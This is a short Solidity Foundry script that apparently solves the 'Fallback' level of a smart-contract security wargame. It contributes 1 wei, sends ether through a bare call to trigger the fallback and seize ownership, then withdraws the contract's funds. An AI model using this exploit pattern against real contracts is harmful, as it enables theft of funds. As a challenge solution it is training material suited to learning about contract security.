// SPDX-Licensed-Identifier: MIT
pragma solidity ^0.8.10;

import {Script} from "forge-std/Script.sol";
import {Fallback} from "../src/level1/Fallback.sol";

contract level1Exploit is Script {
    Fallback fallbackContract =
        Fallback(payable(0xC6bb95ead453bA1144A2AA3a859C9D2122aAc1f7));

    function run() external {
        vm.startBroadcast();

        fallbackContract.contribute{value: 1 wei}();
        address(fallbackContract).call{value: 1 wei}("");
        fallbackContract.withdraw();

        vm.stopBroadcast();
    }
}
